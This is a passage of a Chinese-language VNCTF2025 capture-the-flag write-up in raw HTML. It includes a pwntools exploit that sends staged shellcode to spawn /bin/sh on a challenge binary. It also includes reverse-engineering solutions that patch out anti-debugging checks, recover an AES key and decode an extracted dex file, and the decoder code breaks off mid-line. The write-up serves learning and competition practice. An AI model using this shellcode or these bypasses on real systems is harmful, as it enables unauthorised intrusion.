href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/">Pwn.the-Art-of-Shellcode | V3rdant’s Blog</a></p><p>payload.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch= <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>) </span><br><span class="line"><span class="comment">#p = remote(&quot;node.vnteam.cn&quot;,...)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xchg rdi, rsi</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    add edx, 0x114</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;try to show your strength \n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;0&#x27;</span>*<span class="number">13</span> + asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rsp, rsi</span></span><br><span class="line"><span class="string">    add rsp, 0x114</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi</span></span><br><span class="line"><span class="string">    push r8</span></span><br><span class="line"><span class="string">    mov rcx, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/VNCTF2025/pwn4.png" alt="QQ_1739075764118"></p><h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><p><strong>动态值</strong></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Fuko’s-starfish"><a href="#Fuko’s-starfish" class="headerlink" title="Fuko’s starfish"></a><strong>Fuko’s starfish</strong></h3><p>IDA分析.exe程序发现最终游戏调用的是starfish.dll里面的函数，程序本身似乎没有与flag相关数据。</p><p><img src="/2025/02/12/VNCTF2025/fuko1.png" alt="QQ_1739075923934"></p><p>IDA分析.dll程序的play_snake函数，发现输出”u win”下面分支调用了一个Check函数（改名后的），Check函数有花指令，直接将图2红框部分nop即可F5分析。</p><p><img src="/2025/02/12/VNCTF2025/fuko2.png" alt="QQ_1739076003936"></p><p><img src="/2025/02/12/VNCTF2025/fuko7.png" alt="QQ_1739076991040"></p><p>可以看到函数内部就是主体流程，要解密一段字符串输出然后要求输入，加密最后与被加密的flag进行对比。</p><p><img src="/2025/02/12/VNCTF2025/fuko3.png" alt="QQ_1739076094303"></p><p>输入32长度字符串，被分为16字节为一个单位进行加密，进入加密函数发现有调试器检测，让数据走不同分支处理，直接将下图红框部分nop进行pass，然后将jz改成jmp即可（手动重新算一下相对偏移就行）。</p><p><img src="/2025/02/12/VNCTF2025/fuko11.png" alt="QQ_1739077386431"></p><p><img src="/2025/02/12/VNCTF2025/fuko8.png" alt="QQ_1739077338900"></p><p>可以通过算法特征识别出这是一个标准AES加密，没看出魔改的地方，但是密钥是从全局数据获取再经过一通计算拿的，计算过程不好看，考虑用动调获取，并且图1部分用密钥与输入进来的Input进行了异或，可以通过Input和这段数据进行异或获取到密钥。</p><p><img src="/2025/02/12/VNCTF2025/fuko4.png" alt="QQ_1739076342223"></p><p><img src="/2025/02/12/VNCTF2025/fuko5.png" alt="QQ_1739076365537"></p><p>看到DllMain似乎有反调试，但是似乎只扫描了进程，而且没检测ida，所以就不管了。</p><p><img src="/2025/02/12/VNCTF2025/fuko6.png" alt="QQ_1739076850485"></p><p>直接写一个程序来加载这个dll来call Check函数，便于调试。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> hLib = <span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;starfish.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hLib)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> Addr = (DWORD64)hLib + <span class="number">0x25F0</span>;</span><br><span class="line"><span class="built_in">void</span> (*funcPtr)() = <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">void</span>(*)()&gt;(Addr);</span><br><span class="line"><span class="built_in">funcPtr</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入”1111111111111111”然后动调断点在下图断点，取出所有异或后的值，然后重新与输入字符再次异或拿到Key.</p><p><img src="/2025/02/12/VNCTF2025/fuko9.png" alt="QQ_1739077545772"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> Input[] = <span class="string">&quot;1111111111111111&quot;</span>;</span><br><span class="line">    <span class="type">uint8_t</span> c[]&#123; <span class="number">0x38</span>,<span class="number">0xd4</span>,<span class="number">0xCC</span>,<span class="number">0xDA</span>,<span class="number">0x59</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x87</span>,<span class="number">0x80</span>,<span class="number">0x0A</span>,<span class="number">0xB5</span>,<span class="number">0x39</span>,<span class="number">0xA0</span>,<span class="number">0xDA</span>,<span class="number">0x49</span>,<span class="number">0xE3</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, Input[i] ^ c[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Key</span></span><br><span class="line"><span class="comment">// 09 E5 FD EB 68 31 75 B6 B1 3B 84 08 91 EB 78 D2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再用cyberchef AES解密得到Flag.</p><p><img src="/2025/02/12/VNCTF2025/fuko10.png" alt="QQ_1739077689242"></p><h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{W0w_u_g0t_Fuk0’s_st4rf1sh}</strong></p><h3 id="Hook-Fish"><a href="#Hook-Fish" class="headerlink" title="Hook Fish"></a>Hook Fish</h3><p>jadx分析APK, 发现他会下载一个hook_fish.dex文件, 然后调用里面的check、encode、decode函数。但是他又会delete文件，所以得动调断点在这边然后手动去复制一份文件。</p><p><img src="/2025/02/12/VNCTF2025/fish1.png" alt="QQ_1739078061506"></p><p><img src="/2025/02/12/VNCTF2025/fish2.png" alt="QQ_1739078112517"></p><p>在delete前断点，启动调试，然后输入点击按钮断下，在文件夹中搜到hook_fish.dex复制到windows。</p><p><img src="/2025/02/12/VNCTF2025/fish3.png" alt="QQ_1739078448944"></p><p><img src="/2025/02/12/VNCTF2025/fish4.png" alt="QQ_1739078521968"></p><p>jadx分析hook_fish.dex可以发现有以下几个函数，以及一个被加密的flag。</p><p><img src="/2025/02/12/VNCTF2025/fish5.png" alt="QQ_1739078659633"></p><p>使用decode函数即可解密第一层，第二层解密就是用apk里面的encrypt进行写解密函数。</p><p><img src="/2025/02/12/VNCTF2025/fish6.png" alt="QQ_1739078766431"></p><p>这边发现加密后的1字节对2字节的，也就是从逐字节往后添加进行爆破，免得写解密函数了。</p><p>完整解密代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, Character&gt; fish_dcode;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;Character, String&gt; fish_ecode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">strr</span> <span class="operator">=</span> <span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span> &#123;</span><br><span class="line">        encode_map();</span><br><span class="line">        decode_map();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">encode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;Character, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;iiijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;b&#x27;</span>, <span class="string">&quot;jjjii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;c&#x27;</span>, <span class="string">&quot;jijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;d&#x27;</span>, <span class="string">&quot;jjijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;jjjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;f&#x27;</span>, <span class="string">&quot;ijjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;g&#x27;</span>, <span class="string">&quot;jjjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;h&#x27;</span>, <span class="string">&quot;iijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;i&#x27;</span>, <span class="string">&quot;ijiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;j&#x27;</span>, <span class="string">&quot;iiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;k&#x27;</span>, <span class="string">&quot;jjjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;l&#x27;</span>, <span class="string">&quot;jijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;m&#x27;</span>, <span class="string">&quot;ijiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;iijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;o&#x27;</span>, <span class="string">&quot;ijjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;p&#x27;</span>, <span class="string">&quot;jiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;ijijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;r&#x27;</span>, <span class="string">&quot;jijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;s&#x27;</span>, <span class="string">&quot;iiiii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;t&#x27;</span>, <span class="string">&quot;jjiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;u&#x27;</span>, <span class="string">&quot;ijjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;v&#x27;</span>, <span class="string">&quot;jiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;iiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;iijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;y&#x27;</span>, <span class="string">&quot;jjiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;z&#x27;</span>, <span class="string">&quot;jijjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;iijjl&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;iiilj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;iliii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;jiili&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jilji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;iliji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;jjjlj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;ijljj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;iljji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;0&#x27;</span>, <span class="string">&quot;jjjli&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;String, Character&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&quot;iiijj&quot;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjii&quot;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijij&quot;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjijj&quot;</span>, <span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjjj&quot;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjjj&quot;</span>, <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjji&quot;</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijii&quot;</span>, <span class="string">&#x27;h&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiji&quot;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiji&quot;</span>, <span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjij&quot;</span>, <span class="string">&#x27;k&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijji&quot;</span>, <span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiij&quot;</span>, <span class="string">&#x27;m&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijji&quot;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjij&quot;</span>, <span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiji&quot;</span>, <span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijijj&quot;</span>, <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijii&quot;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiii&quot;</span>, <span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiij&quot;</span>, <span class="string">&#x27;t&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjji&quot;</span>, <span class="string">&#x27;u&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiij&quot;</span>, <span class="string">&#x27;v&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiij&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijij&quot;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiji&quot;</span>, <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijjj&quot;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijjl&quot;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiilj&quot;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliii&quot;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiili&quot;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jilji&quot;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliji&quot;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjlj&quot;</span>, <span class="string">&#x27;7&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijljj&quot;</span>, <span class="string">&#x27;8&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iljji&quot;</span>, <span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjli&quot;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_ecode.get(Character.valueOf(str.charAt(i))));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i2 &lt; str.length() / <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i + <span class="number">5</span>;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_dcode.get(str.substring(i, i3)));</span><br><span class="line">            i2++;</span><br><span class="line">            i = i3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] str1 = str.getBytes();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str1.length; i++) &#123;</span><br><span class="line">            str1[i] = (<span class="type">byte</span>) (str1[i] + <span class="number">68</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexStringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : str1) &#123;</span><br><span class="line">            hexStringBuilder.append(String.format(<span class="string">&quot;%02x&quot;</span>, Byte.valueOf(b)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> hexStringBuilder.toString();</span><br><span class="line">        <span class="type">char</span>[] str3 = str2.toCharArray();</span><br><span class="line">        codes(str3, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; str3.length; i2++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str3[i2] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str3[i2] &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) ((str3[i2] - <span 